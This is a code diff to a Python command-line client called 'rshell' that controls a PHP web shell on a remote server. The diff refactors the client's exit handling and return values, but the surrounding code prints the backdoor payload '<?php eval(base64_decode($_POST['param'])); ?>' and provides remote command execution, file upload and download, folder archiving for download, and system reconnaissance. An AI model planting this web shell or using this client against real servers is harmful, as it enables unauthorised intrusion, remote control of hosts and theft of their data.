@@ -24,6 +24,7 @@ class rshell(Cmd):
         print "compress_folder: compress_folder folder_path file.tar.gz"
         print "do_dwfolder: do_dwfolder folder_path"
         print "Or write a command to send to the server shell"
+        return None
 
     def default(self, line):
         #This is the default command method
@@ -38,10 +39,19 @@ class rshell(Cmd):
         print "Deja de darle al enter"
 
     def do_quit(self, line):
-        exit(0)
+        #Return true to exit in postcmd
+        return True
+
+    def postcmd(self, stop, line):
+        #This stop cmdloop if returns true
+        #check if stop value is true
+        #stop is the return value of do_* methods
+        if stop:
+            return True
 
     def do_exit(self, line):
-        exit(0)
+        #Return true to exit in postcmd
+        return True
 
     def dorequest(self, phpcmd):
         #Post request using the param parameter
@@ -75,9 +85,11 @@ class rshell(Cmd):
     def do_shell(self, line):
         #This method execute the command locally
         print os.popen(line).read()
+        return None
 
     def do_payload(self, line):
         self.print_payload()
+        return None
 
     def do_phpinfo(self, line):
         #This is the default command method
@@ -85,6 +97,7 @@ class rshell(Cmd):
         s = "phpinfo();"
         #doing the request to the server
         self.dorequest(s)
+        return None
 
     def print_payload(self):
         print "<?php eval(base64_decode($_POST['param'])); ?>"
@@ -99,6 +112,7 @@ class rshell(Cmd):
             f.close()
         else:
             print "Error"
+        return None
 
     def do_upload(self, line):
         (filename, destination) = line.split()
@@ -112,11 +126,13 @@ class rshell(Cmd):
             print data
         else:
             print "Error"
+        return None
 
     def do_compress_folder(self, line):
         (folder, archivo) = line.split()
         cmd = "tar -czf {0} {1}".format(archivo, folder)
         self.default(cmd)
+        return None
 
     def do_dwfolder(self, line):
         if line[-1:] == "/":
@@ -124,6 +140,7 @@ class rshell(Cmd):
         filename = "{0}.tar.gz".format(os.path.basename(line))
         self.do_compress_folder("{0} {1}".format(line, filename))
         self.do_download("{0} {1}".format(filename, filename))
+        return None
 
     def do_getsysinfo(self, line):
         #Print user and system information
@@ -172,13 +189,14 @@ class rshell(Cmd):
         print "-" * 80
         cmd = "cat /etc/hosts"
         self.default(cmd)
+        return None
 
     def do_getswversion(self, line):
         #Print some software versions
         print "=" * 80
         print "Software versions:"
         print "-" * 80
-        cmd = "gcc -v"
+        cmd = "gcc --version"
         self.default(cmd)
         print "-" * 80
         cmd = "mysql --version"
@@ -193,6 +211,7 @@ class rshell(Cmd):
         cmd = "python --version"
         self.default(cmd)
         print "-" * 80
+        return None
 
     def file_exists(self, filename):
         cmd = "if (file_exists('{0}')) echo 1;".format(filename)
@@ -209,3 +228,4 @@ class rshell(Cmd):
             #Check filename, [:-1] to remove eol
             self.file_exists(filename[:-1])
         filelist.close()
+        return None
